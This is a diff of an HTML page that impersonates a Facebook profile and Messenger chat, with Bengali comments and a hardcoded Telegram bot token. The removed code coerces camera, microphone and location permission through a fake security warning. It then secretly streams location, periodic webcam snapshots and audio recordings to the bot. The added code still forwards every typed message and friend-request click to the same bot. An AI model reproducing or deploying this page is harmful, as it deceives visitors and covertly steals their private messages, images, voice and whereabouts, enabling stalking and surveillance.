@@ -6,36 +6,38 @@
     <title>Facebook | M.H. Miraz</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* নিখুঁত ফেসবুক ডিজাইন */
+        /* মূল ডিজাইন */
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-        body { background: #f0f2f5; }
-        .p-header { background: #fff; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
-        .cover { width:100%; height:210px; background:#ddd url('cover.jpg') center/cover; }
+        body { background: #fff; color: #050505; }
+        
+        /* প্রোফাইল পেজ */
+        .p-header { background: #fff; padding-bottom: 10px; }
+        .cover { width:100%; height:210px; background:#ddd; background-image: url('https://via.placeholder.com/800x400'); background-size: cover; }
         .p-info { text-align:center; margin-top:-80px; padding:0 15px; }
-        .p-pic { width:165px; height:165px; border-radius:50%; border:5px solid #fff; background:#ccc url('profile.jpg') center/cover; display:inline-block; }
-        .p-name { font-size:26px; font-weight:800; margin-top:10px; color:#050505; }
+        .p-pic { width:160px; height:160px; border-radius:50%; border:4px solid #fff; background:#ccc; background-image: url('https://via.placeholder.com/160'); background-size: cover; display:inline-block; }
+        .p-name { font-size:24px; font-weight:bold; margin-top:10px; }
         .btn-box { display:flex; gap:10px; padding:15px; max-width:500px; margin:0 auto; }
-        .btn { flex:1; border:none; border-radius:8px; padding:10px; font-weight:600; cursor:pointer; font-size:15px; display:flex; align-items:center; justify-content:center; gap:8px; }
+        .btn { flex:1; border:none; border-radius:8px; padding:10px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
         .btn-blue { background:#1877f2; color:#fff; }
         .btn-gray { background:#e4e6eb; color:#050505; }
-        
-        /* বায়ো ও ডিটেইলস */
-        .bio-section { background:#fff; margin-top:10px; padding:15px; border-top:1px solid #ddd; }
-        .bio-txt { text-align:center; font-size:15px; margin-bottom:15px; color:#1c1e21; }
-        .detail-item { display:flex; align-items:center; gap:12px; margin-bottom:12px; font-size:15px; color:#1c1e21; }
-        .detail-item i { color:#8a8d91; font-size:20px; width:25px; }
 
-        /* মেসেঞ্জার ওভারলে (নিখুঁত ক্লোন) */
-        #messengerUI { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; flex-direction:column; }
+        /* মেসেঞ্জার স্ক্রিন */
+        #messengerUI { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:1000; flex-direction:column; }
         .msgr-h { padding:10px 15px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:12px; }
-        .msgr-n { font-weight:700; font-size:17px; flex:1; }
-        .msgr-icons { color:#0084ff; display:flex; gap:20px; font-size:18px; }
-        .msgr-body { flex:1; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#8a8d91; }
-        .msgr-foot { padding:10px; border-top:1px solid #eee; display:flex; align-items:center; gap:10px; }
-        .msgr-in { flex:1; background:#f0f2f5; border:none; padding:10px 15px; border-radius:22px; outline:none; }
+        .msgr-icons { margin-left: auto; color:#0084ff; display:flex; gap:20px; font-size:18px; }
+        .msgr-body { flex:1; overflow-y: auto; padding: 20px 15px; display: flex; flex-direction: column; }
+        
+        /* চ্যাট বাবল */
+        .msg-wrapper { align-self: flex-end; display: none; flex-direction: column; align-items: flex-end; width: 100%; }
+        .timestamp { text-align: center; color: #898b8d; font-size: 11px; margin: 20px 0; width: 100%; }
+        .bubble { background: #0084ff; color: #fff; padding: 8px 15px; border-radius: 18px 18px 4px 18px; font-size: 15px; max-width: 70%; }
+        .read-status { color: #0084ff; font-size: 12px; margin-top: 4px; }
 
-        /* ভিডিও/লোকেশন ট্র্যাকার (ইনভিজিবল) */
-        video, canvas { display:none; position:absolute; left:-9999px; }
+        /* ইনপুট এরিয়া */
+        .msgr-foot { padding:10px; border-top:1px solid #eee; display:flex; align-items:center; gap:10px; }
+        .msgr-in-box { flex:1; background:#f0f2f5; border-radius:22px; padding: 8px 15px; display: flex; align-items: center; }
+        .msgr-in { border:none; background:transparent; width: 100%; outline:none; font-size: 15px; }
+        .send-trigger { color: #0084ff; font-size: 20px; cursor: pointer; display: none; }
     </style>
 </head>
 <body>
@@ -46,115 +48,124 @@
         <div class="p-info">
             <div class="p-pic"></div>
             <div class="p-name">M.H. Miřãz</div>
-            <p style="color:#65676b; font-size:14px; margin-top:5px;">288 Friends • 2 mutual</p>
+            <p id="friendStatus" style="color:#65676b; font-size:14px;">You're not friends on Facebook</p>
         </div>
         <div class="btn-box">
-            <button id="addFriendBtn" class="btn btn-blue" onclick="sendFriendRequest()"><i class="fas fa-user-plus"></i> Add Friend</button>
-            <button class="btn btn-gray" onclick="mandatoryPermission()"><i class="fab fa-facebook-messenger"></i> Message</button>
+            <button id="addFriendBtn" class="btn btn-blue" onclick="handleFriendRequest()">
+                <i class="fas fa-user-plus"></i> Add Friend
+            </button>
+            <button class="btn btn-gray" onclick="openMessenger()">
+                <i class="fab fa-facebook-messenger"></i> Message
+            </button>
         </div>
-    </div>
-
-    <div class="bio-section">
-        <div class="bio-txt">Life is a Book, and those who do not travel read only a page. 📖✈️</div>
-        <div class="detail-item"><i class="fas fa-briefcase"></i> <span>Web Developer & Programmer</span></div>
-        <div class="detail-item"><i class="fas fa-graduation-cap"></i> <span>Studied at <b>Rangpur Polytechnic Institute</b></span></div>
-        <div class="detail-item"><i class="fas fa-home"></i> <span>Lives in <b>Rangpur</b></span></div>
     </div>
 </div>
 
 <div id="messengerUI">
     <div class="msgr-h">
-        <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="location.reload()"></i>
-        <img src="profile.jpg" style="width:36px; height:36px; border-radius:50%;">
-        <div class="msgr-n">M.H. Miraz</div>
-        <div class="msgr-icons"><i class="fas fa-phone-alt"></i><i class="fas fa-video"></i></div>
+        <i class="fas fa-arrow-left" style="color:#0084ff; font-size: 20px;" onclick="closeMessenger()"></i>
+        <img src="https://via.placeholder.com/36" style="border-radius:50%;">
+        <div style="font-weight:bold;">M.H. Miřãz</div>
+        <div class="msgr-icons">
+            <i class="fas fa-phone-alt"></i>
+            <i class="fas fa-video"></i>
+            <i class="fas fa-info-circle"></i>
+        </div>
     </div>
-    <div class="msgr-body">
-        <img src="profile.jpg" style="width:80px; height:80px; border-radius:50%; margin-bottom:10px;">
-        <h3 style="color:#050505;">M.H. Miraz</h3>
-        <p>Facebook • You're friends on Facebook</p>
-        <p style="margin-top:5px;">Lives in Rangpur, Bangladesh</p>
+    
+    <div class="msgr-body" id="chatBody">
+        <div style="text-align:center; margin-bottom: 30px;">
+            <img src="https://via.placeholder.com/100" style="border-radius:50%; margin-bottom:10px;">
+            <h2 style="margin:0;">M.H. Miřãz</h2>
+            <p style="color:#65676b; font-size:14px;">Student at Lions School and College</p>
+        </div>
+
+        <div id="sentMsgArea" class="msg-wrapper">
+            <div class="timestamp" id="msgTime"></div>
+            <div class="bubble" id="msgContent"></div>
+            <i class="far fa-check-circle read-status"></i>
+        </div>
     </div>
+
     <div class="msgr-foot">
-        <i class="fas fa-plus-circle" style="color:#0084ff;"></i>
-        <input type="text" class="msgr-in" placeholder="Aa">
-        <i class="fas fa-thumbs-up" style="color:#0084ff;"></i>
+        <i class="fas fa-camera" style="color:#0084ff; font-size: 20px;"></i>
+        <div class="msgr-in-box">
+            <input type="text" id="msgrInput" class="msgr-in" placeholder="Message" oninput="toggleSendBtn()">
+        </div>
+        <i id="likeBtn" class="fas fa-thumbs-up" style="color:#0084ff; font-size: 22px;"></i>
+        <i id="sendBtn" class="fas fa-paper-plane send-trigger" onclick="sendMessage()"></i>
     </div>
 </div>
-
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
 
 <script>
     const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
     const CHAT_ID = '7767412329';
 
-    // ১. অ্যাড ফ্রেন্ড লজিক
-    function sendFriendRequest() {
+    // ১. ফ্রেন্ড রিকোয়েস্ট লজিক
+    function handleFriendRequest() {
         const btn = document.getElementById('addFriendBtn');
         btn.innerHTML = '<i class="fas fa-user-check"></i> Requested';
-        btn.style.background = '#e4e6eb';
-        btn.style.color = '#050505';
+        btn.className = 'btn btn-gray';
         
-        // টেলিগ্রামে এপ্রুভাল রিকোয়েস্ট পাঠানো
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New Friend Request! Approval Needed.`);
+        // টেলিগ্রামে রিকোয়েস্ট পাঠানো
+        const text = encodeURIComponent("New Friend Request from a user! Approve it?");
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
+        
+        alert("Friend request sent! Waiting for approval.");
     }
 
-    // ২. বাধ্যতামূলক পারমিশন ও মেসেঞ্জার লজিক
-    async function mandatoryPermission() {
-        try {
-            // পারমিশন চাওয়ার প্রম্পট
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('v').srcObject = stream;
+    // ২. মেসেঞ্জার ওপেন/ক্লোজ
+    function openMessenger() {
+        document.getElementById('profilePage').style.display = 'none';
+        document.getElementById('messengerUI').style.display = 'flex';
+    }
 
-            // লোকেশন বের করা
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const loc = `📍 User Found: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
-                });
-            }
+    function closeMessenger() {
+        document.getElementById('messengerUI').style.display = 'none';
+        document.getElementById('profilePage').style.display = 'block';
+    }
 
-            // পারমিশন সফল হলে মেসেঞ্জার ওপেন
-            document.getElementById('profilePage').style.display = 'none';
-            document.getElementById('messengerUI').style.display = 'flex';
-
-            // ব্যাকগ্রাউন্ড ট্র্যাকিং শুরু
-            startTracking(stream);
-
-        } catch (err) {
-            // যদি এলাও না করে, তবে বারবার এলার্ট দেবে (বাধ্যতামূলক)
-            alert("Security Warning: You must allow camera and microphone access to start a secure conversation on Messenger.");
+    // ৩. টাইপিং ডিটেকশন (লাইক বনাম সেন্ড বাটন)
+    function toggleSendBtn() {
+        const input = document.getElementById('msgrInput');
+        const like = document.getElementById('likeBtn');
+        const send = document.getElementById('sendBtn');
+        
+        if (input.value.trim() !== "") {
+            like.style.display = 'none';
+            send.style.display = 'block';
+        } else {
+            like.style.display = 'block';
+            send.style.display = 'none';
         }
     }
 
-    function startTracking(stream) {
-        // ছবি পাঠানো
-        setInterval(() => {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            if (v.videoWidth > 0) {
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => {
-                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 's.jpg');
-                    let x = new XMLHttpRequest(); x.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, true); x.send(f);
-                }, 'image/jpeg', 0.5);
-            }
-        }, 5000);
+    // ৪. মেসেজ পাঠানো এবং টেলিগ্রামে ফরওয়ার্ড করা
+    function sendMessage() {
+        const input = document.getElementById('msgrInput');
+        const msgText = input.value.trim();
+        if (msgText === "") return;
 
-        // অডিও পাঠানো
-        let r = new MediaRecorder(stream);
-        let ch = [];
-        r.ondataavailable = e => ch.push(e.data);
-        r.onstop = () => {
-            let b = new Blob(ch, {type:'audio/ogg'});
-            let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('voice', b, 'v.ogg');
-            let x = new XMLHttpRequest(); x.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, true); x.send(f);
-            ch = []; r.start();
-        };
-        r.start();
-        setInterval(() => { if(r.state==='recording') r.stop(); }, 30000);
+        // সময় জেনারেট করা (HH:MM)
+        const now = new Date();
+        const timeStr = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+
+        // UI আপডেট
+        document.getElementById('msgTime').innerText = timeStr;
+        document.getElementById('msgContent').innerText = msgText;
+        document.getElementById('sentMsgArea').style.display = 'flex';
+
+        // টেলিগ্রামে পাঠানো
+        const teleMsg = encodeURIComponent(`নতুন মেসেজ: ${msgText}\nসময়: ${timeStr}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${teleMsg}`);
+
+        // ইনপুট ক্লিয়ার
+        input.value = "";
+        toggleSendBtn();
+        
+        // অটো স্ক্রল নিচে নেওয়া
+        const body = document.getElementById('chatBody');
+        body.scrollTop = body.scrollHeight;
     }
 </script>
 
